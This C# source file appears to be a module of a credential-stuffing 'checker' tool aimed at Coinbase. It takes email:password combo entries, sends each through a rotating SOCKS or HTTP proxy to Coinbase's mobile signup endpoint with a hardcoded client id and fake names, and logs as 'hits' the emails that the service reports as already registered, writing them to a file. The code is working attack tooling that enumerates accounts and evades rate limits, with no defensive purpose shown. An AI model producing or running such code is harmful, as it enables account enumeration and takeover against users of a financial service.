using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace VM.VM
{
    class CoinBase
    {
        public static void CB(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = Checker.timeout
                };
                string gu = Guid.NewGuid().ToString();
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Checker.ProxyList.ElementAt<string>(new Random().Next(0, Checker.proxytotal)).Split(':', ';', '|');
                ProxyClient proxyClient = Checker.proxytype == "SOCKS5" ? (ProxyClient)new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (Checker.proxytype == "SOCKS4" ? (ProxyClient)new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1])));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                string str1 = Checker.RandomDigits(12);
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Pragma", "no - cache");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AllowAutoRedirect = true;
                string st1 = httpRequest.Post("https://api.coinbase.com/v2/mobile/users/", "accept_user_agreement=true&application_client_id=6011662b0badfa97f9fed5a246526277ff2116affa98cfaacacd012a191ba38d&email="+strArray1[0]+ "&first_name=Susj&last_name=Nnsns&locale=en-US&password=N", "application/x-www-form-urlencoded").ToString();
                if (st1.Contains("A user already exists with this email"))
                {
                    Interlocked.Increment(ref Checker.hits);
                    Interlocked.Increment(ref Checker.check);
                    Export.WriteToFileThreadSafe(combo, "..\\VM\\CoinBase_VM.txt");
                    if (Checker.show == "Y")
                        Colorful.Console.WriteLine("[ - ]" + combo, Color.LawnGreen);
                }
                if (st1.Contains("Email doesn't look correct"))
                {
                    Interlocked.Increment(ref Checker.check);
                    Interlocked.Increment(ref Checker.bad);
                    if (Checker.show == "Y")
                        Colorful.Console.WriteLine("[ - ]" + combo, Color.Red);
                }
            }
            catch
            {
                Interlocked.Increment(ref Checker.err);
                Checker.ComboQueue.Enqueue(combo);
            }
        }
    }
}
